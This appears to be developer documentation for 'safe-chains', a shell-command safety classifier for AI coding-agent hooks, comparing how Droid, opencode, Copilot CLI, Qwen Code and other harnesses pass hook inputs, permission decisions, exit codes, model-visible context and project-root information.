- **Input.** `session_id`, `transcript_path`, `cwd`, `permission_mode`
  (`off`, `spec`, `auto-low`, `auto-medium`, `auto-high`), `hook_event_name`,
  and for tools `tool_name` plus `tool_input`. The project root is the
  `FACTORY_PROJECT_DIR` environment variable.
- **Decisions.** `hookSpecificOutput.permissionDecision`: `allow` (can bypass the
  permission prompt), `deny` (the reason is sent to Droid), `ask` (forces a
  confirmation). `updatedInput` rewrites tool parameters. Exit 0 is success. Exit 2
  blocks `PreToolUse` and stderr is the reason. Any other non-zero exit is recorded
  and does not block. `additionalContext` is documented for `PostToolUse`,
  `UserPromptSubmit`, and `SessionStart`. It is not listed on `PreToolUse`.
- **What safe-chains emits.** The Claude-shaped allow envelope for a safe command,
  an empty body otherwise, and `additionalContext` on `PreToolUse` for the
  mixed-chain note. It does not emit `deny` or `ask`.

Verified: droid 0.245.0 2026-10-21

### opencode — docs-checked v2.0.26, 2026-10-21

`opencode --version` is v2.0.26. Not driven live. Sources:
[permissions](https://opencode.ai/v2/docs/permissions/),
[plugin migration](https://opencode.ai/v2/docs/build/plugins/migrate-v1/),
[plugin hooks](https://opencode.ai/v2/docs/build/plugins/).

- **v1 `permission.ask`.** The plugin hook is defined and does not fire
  ([#7006](https://github.com/anomalyco/opencode/issues/7006)). The 2026-07 check
  removed `--opencode-config`, which rendered an empty `permission.bash` map.
- **v2 permissions.** Rules are ordered `{action, resource, effect}` entries.
  `effect` is `allow`, `ask`, or `deny`. The last match wins. The shell action's
  resource is the scanner's command string, matched with `*` and `?` wildcards.
  A glob such as `git *` covers `git status` and `git push` together. `--auto`
  approves a request that is not an explicit deny. An explicit configured deny
  is final.
- **v2 plugin hook.** The migration table maps v1 `permission.ask` to
  `ctx.permission.hook("evaluate")`. The hook runs for `allow` and `ask`
  decisions and does not run for an explicit deny. It may set `effect` to
  `allow`, `ask`, or `deny`, and `message` is the prompt text or the denial
  reason. `ctx.shell.hook("create.before")` sees `command`, `cwd`, `timeout`,
  `shell`, and `env` before the command runs. This was not driven on v2.0.26.
- **What safe-chains does.** `install()` returns Skip. The skip text still says
  there is no runtime hook because `permission.ask` does not fire. It does not
  register `permission.evaluate`.

Verified: opencode 2.0.26 2026-10-21

### GitHub Copilot CLI — docs-checked v1.0.101, 2026-10-21

The `copilot` CLI is not installed. v1.0.101 (2026-10-20) is the latest
[GitHub release](https://github.com/github/copilot-cli/releases/tag/v1.0.101) and the
matching npm package. The live drive below is v1.0.71. Current contract:
[hooks reference](https://docs.github.com/en/copilot/reference/hooks-reference).

- **Config.** `{version: 1, hooks.preToolUse[]}`. A command hook names its script in
  `bash`, `powershell`, `command`, or `exec`. `timeoutSec` is seconds, default 30
  (`timeout` is the alias). Loaded from policy `/etc/github-copilot/policy.d/*.json`,
  repo `.github/hooks/*.json`, user `~/.copilot/hooks/` or `$COPILOT_HOME/hooks/`,
  plugins, and an inline `hooks` block in `~/.copilot/settings.json` and
  `.claude/settings.json`. The CLI does not read `~/.copilot/config.json` for hooks.
  An optional `matcher` is a regex anchored as `^(?:PATTERN)$` against the whole
  `toolName`. safe-chains writes `~/.copilot/hooks/safe-chains.json` with `bash`,
  `timeoutSec` 60, and no matcher, and self-filters `toolName == "bash"`.
- **Input.** camelCase `preToolUse` carries `sessionId`, `timestamp` (a number),
  `cwd`, `toolName`, and `toolArgs` typed `unknown`. The v1.0.71 drive saw `toolArgs`
  as a JSON string, and the parser still double-decodes a string. PascalCase
  `PreToolUse` uses snake_case, Claude tool names (`bash` is reported as `Bash`),
  and `tool_input` parsed from a JSON string when that parse succeeds. No project-root
  field is documented.
- **Decisions.** `permissionDecision` is `allow`, `deny`, or `ask`. Empty output is
  the default permission flow. `permissionDecisionReason` is required on `deny` and
  is shown to the agent. `modifiedArgs` replaces the tool arguments. CLI autopilot
  denies `ask` (no prompt). The cloud agent treats `ask` as `deny`. A hook `allow`
  does not pre-approve a sandbox escape (`requestSandboxBypass: true`); only `deny`
  propagates for that request.
- **Exit codes.** A command `preToolUse` hook fails closed: a crash or any non-zero
  exit, including exit 2, denies the call even when stdout says `allow`. A timeout
  fails open and the call continues through the normal permission flow. HTTP
  `preToolUse` hooks fail open. safe-chains exits 0 on a payload it cannot parse,
  so that path is not this deny.
- **What safe-chains emits.** `allow` plus `permissionDecisionReason` for a safe
  command, and an empty body for a gated command. It does not emit `ask`.
  `additionalContext` is a `postToolUse`, `sessionStart`, and `subagentStart` field,
  not a `preToolUse` field.
- **Live drive (v1.0.71, 2026-07).** Per-repo `.github/hooks/*.json` fired on bash
  calls. A forced `deny` blocked `echo` and showed the reason. A forced `allow` ran
  `cat /etc/hosts` with no directory-access prompt. That is the last drive against
  a running CLI.

Verified: copilot 1.0.101 2026-10-21

### Qwen Code — docs-checked v0.25.3, 2026-10-21

The `qwen` binary is not installed. Stable v0.25.3 (2026-10-19) is the latest
release that is not a preview. A preview v0.25.4-preview.1 exists (2026-10-20).
Contract read from the English source at tag v0.25.3:
[hooks.md](https://github.com/QwenLM/qwen-code/blob/v0.25.3/docs/users/features/hooks.md).
Translated mirrors describe `allow` as skipping the prompt. This section follows
the English source. Not driven live.

- **Config.** `hooks.PreToolUse` in settings. The matcher target for tool events
  is the tool id. The shell tool id is `run_shell_command`. An exact comparison
  runs first; otherwise the matcher is a regular expression, unanchored unless
  it starts with `^` or `(`. `timeout` for a command hook is seconds, default 60.
  A command-hook value of 1000 or more is still read as milliseconds, so the
  `60000` safe-chains writes is 60 seconds. `QWEN_PROJECT_DIR`,
  `CLAUDE_PROJECT_DIR`, and `GEMINI_PROJECT_DIR` are set on the hook process.
- **Decisions.** `hookSpecificOutput.permissionDecision`: `allow`, `deny`, or
  `ask`. `permissionDecisionReason` is required. `allow` lets the call continue
  and the usual permission checks and approval prompt still apply. `deny` blocks
  the tool and returns an error to the model. `ask` prompts in the TUI and no
  permission rule, approval mode (including YOLO), or `PermissionRequest` hook
  approves the call instead. A `PermissionRequest` hook can still deny it. In
  headless `--prompt` runs, background subagents, and ACP sessions, `ask` is
  treated as `deny`. `updatedInput` replaces the whole tool input. It is not a
  merge. `additionalContext` is appended to the tool result the model sees.
  It is delivered whatever the decision, and dropped when the user declines an
  `ask` or the call is cancelled. The output options mark `permissionDecision`
  and `permissionDecisionReason` required.
- **Exit codes.** Exit 0 with a JSON object controls the call. Exit 2 ignores
  stdout and passes stderr to the model as the block reason. Any other non-zero
  exit continues.
- **What safe-chains emits.** A Claude-shaped `permissionDecision: "allow"` for
  a safe command, an empty body otherwise, and `additionalContext` with no
  decision for the mixed-chain note. The installed matcher is `^Bash$`. A
  matcher that starts with `^` is only a regular expression, and the `Bash`
  alias is compared exactly, so `^Bash$` does not select `run_shell_command`.
  A present `tool_name` must be `Bash`. The payload's `tool_name` is the
  runtime id.
- **Other command surface.** In Code Mode, a call made from an `exec` script
  returns its result to the script. Its `PreToolUse` context is appended to the
  `exec` result.

Verified: qwen 0.25.3 2026-10-21

## Model-visible context injection (`additionalContext`)

This is what powers the chain-explainer feedback (`cst::explain`). It injects
text into the model's context **without** a permission decision, so the normal
flow is untouched.

| Target  | `additionalContext` support | What we do |
|---------|-----------------------------|------------|
| Claude  | Yes ([Hooks](https://code.claude.com/docs/en/hooks), v2.1.302; also the 2026-07 drive) | emit on the mixed-chain case |
| Grok    | Yes, on settings-file `PreToolUse` (`~/.grok/docs/user-guide/10-hooks.md`; clipped at 10,000 characters; dropped on hook deny, prompt reject, and `defer`) | default abstain |
| Qwen    | Yes on `PreToolUse` ([hooks.md](https://github.com/QwenLM/qwen-code/blob/v0.25.3/docs/users/features/hooks.md) at v0.25.3). Output options also mark `permissionDecision` and `permissionDecisionReason` required | emit on the mixed-chain case, with no decision |
| Droid   | Not listed on `PreToolUse` ([hooks reference](https://docs.factory.com/reference/hooks-reference.md) lists it on `PostToolUse`, `UserPromptSubmit`, `SessionStart`) | code still emits it on `PreToolUse` |
| Codex   | Yes on `PreToolUse` ([Hooks](https://learn.chatgpt.com/docs/hooks), CLI 0.163.0). `PermissionRequest` has no `additionalContext` field | default abstain (emit nothing) |
| Cursor  | No `additionalContext` on `beforeShellExecution` ([Hooks](https://cursor.com/docs/hooks): `permission`, `user_message`, `agent_message`) | default abstain |
| Gemini  | Not a `BeforeTool` field ([hooks reference](https://geminicli.com/docs/hooks/reference/) puts `additionalContext` on `BeforeAgent`) | n/a |
| agy     | No context field ([Hooks](https://antigravity.google/docs/hooks): `decision`, `reason`, `overwrite`, `permissionOverrides`) | n/a |
| Copilot | Not a `preToolUse` field (v1.0.101 [hooks reference](https://docs.github.com/en/copilot/reference/hooks-reference): `postToolUse`, `sessionStart`, `subagentStart`) | default abstain |

Targets without verified support keep `HookFormat::render_context`'s default,
which emits an empty body — i.e. exactly the prior abstain behavior, no
regression. Promote a target out of the default only after confirming its hook
schema has a context field that does not change the permission outcome.

Source of the verified Claude facts: Claude Code hooks documentation
(`hookSpecificOutput.additionalContext`, `permissionDecision` values, and that
`ask`/`deny` override the user's allowlist while `additionalContext` alone does
not).

## Hook payload capabilities — what each harness can pass

We currently parse only `command` (+ `cwd`, into `HookInput.cwd`, unused so far).
But the harnesses hand a hook far more, and the **project root** in particular is
what an accurate cwd-aware classifier needs (HP-19): resolving `cwd + relative`
only tells "in the project" from "in /etc" if we know the root, and safe-chains
must never touch the filesystem to find it, so it has to arrive as input.

**Working-directory / project-root availability** (⚠️ reverse-engineered from
harness docs + our own parsers; not yet verified against live harnesses — see the
e2e note):

| Harness  | `cwd` (payload) | project root | root arrives via |
|----------|:---------------:|:------------:|------------------|
| Claude   | ✅ | ✅ | `CLAUDE_PROJECT_DIR` env var (hook process) |
| Cursor   | ✅ | ✅ | `workspace_roots[]` in the payload JSON |
| Gemini   | ✅ (also `GEMINI_CWD` env) | ✅ | `GEMINI_PROJECT_DIR` env var |
| agy      | ✅ (`toolCall.args.Cwd`; safe-chains reads `workspacePaths[0]`) | ✅ | `workspacePaths[0]` in the payload |
| Grok     | ✅ | ✅ | `workspaceRoot` in the payload (also `GROK_WORKSPACE_ROOT`) |
| Droid    | ✅ | ✅ | `FACTORY_PROJECT_DIR` env var |
| Qwen     | ✅ | ✅ | `QWEN_PROJECT_DIR` env var |
| Codex    | ✅ | ❌ | session `cwd` only — no distinct project root; `exec_command`'s workdir is omitted |
| Copilot  | ✅ | ❌ | cwd only — no documented root field/var |
| opencode | ❌ in safe-chains | ❌ in safe-chains | v2 `permission.evaluate` receives the shell command as a resource; safe-chains installs no plugin |

So **7 of 10 give a distinct project root** (env var for 4, payload for cursor,
agy, and Grok); Codex/Copilot give `cwd` but no root; opencode's evaluate hook
can see the command, and safe-chains installs no plugin so nothing arrives. When a root is unavailable, the classifier must fall back to today's
`relative == worktree` assumption — use the signal where present, never regress.
Env-var roots are read from the hook *process* env (set by the harness, not the
agent's shell), so they are reasonably tamper-resistant.

**The full rubric — everything a harness may pass** (union; no harness sends all).
Kept as a menu for *future* safe-chains features, with the plausible use:

| Field (varies in name/casing) | Harnesses | Possible safe-chains use |
|---|---|---|
| `command` / `tool_input.command` | all | the thing we classify (why we exist) |
| `tool_name` | Claude, Gemini, Codex, Droid, Copilot, Qwen | scope the hook to the shell tool; skip non-shell tools |
| `cwd` | all but opencode | cwd-aware classification (HP-19 #1) |
| project root (env / `workspace_roots`) | Claude, Cursor, Gemini, Droid, Qwen | the root HP-19 needs |
| `session_id` / `conversation_id` | all but opencode | **unforgeable session key for HP-17** session grants |
| `transcript_path` | Claude, Gemini, Codex, Droid, Qwen | richer context; audit trail |
| `hook_event_name` | most | confirm we're on the pre-exec event |
| `tool_use_id` / `turn_id` / `generation_id` | Claude, Codex, Cursor | correlate a decision to a specific call |
| `model` | Codex, Cursor | per-model policy |
| `permission_mode` | Claude, Droid, Codex (`default`, `acceptEdits`, `plan`, `dontAsk`, `bypassPermissions`) | respect the user's current mode |
| `timestamp` | Gemini, Qwen, Copilot | logging |
| `cursor_version` / cli version | Cursor | version-gate quirks |
| `user_email` | Cursor | attribution |
| `last_assistant_message` / `input_messages` | Codex (legacy notify) | intent context |

**e2e testing (owed).** All of the above is derived from docs and our parsers, not
observed on this machine. The env-var roots especially (`CLAUDE_PROJECT_DIR`,
`GEMINI_PROJECT_DIR`, `FACTORY_PROJECT_DIR`, `QWEN_PROJECT_DIR`) must be confirmed
to actually be present in the hook *process* environment at runtime before we
depend on them. We should eventually stand up **end-to-end tests that install
safe-chains into each harness on this computer** and capture a real payload +
process env per harness — both to verify this table and to catch schema drift.
Until then, treat every ✅ here as "documented, unverified," and keep the
None-fallback so an absent field is never a security regression.
